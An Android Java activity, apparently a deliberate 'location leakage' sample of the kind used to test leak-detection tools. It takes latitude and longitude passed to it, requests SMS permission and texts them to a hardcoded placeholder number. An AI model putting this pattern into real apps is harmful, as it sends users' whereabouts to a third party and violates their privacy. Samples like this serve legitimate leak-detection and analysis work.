package com.andras.locationleakage;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class LeakageActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_SEND_SMS = 1;
    private double latitude;
    private double longitude;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leakage);

        Bundle bundle = getIntent().getExtras();
        if (bundle != null) {
            latitude = bundle.getDouble("latitude");
            longitude = bundle.getDouble("longitude");

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.SEND_SMS},
                        PERMISSIONS_REQUEST_SEND_SMS);
            } else {
                sendLocationSms();
            }
        } else {
            Toast.makeText(this, "No location information available", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendLocationSms() {
        String message = "My current location is: " + latitude + ", " + longitude;

        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("0123456789", null, message, null, null);

        Toast.makeText(this, "Location sent via SMS", Toast.LENGTH_SHORT).show();
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_SEND_SMS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                sendLocationSms();
            } else {
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }
}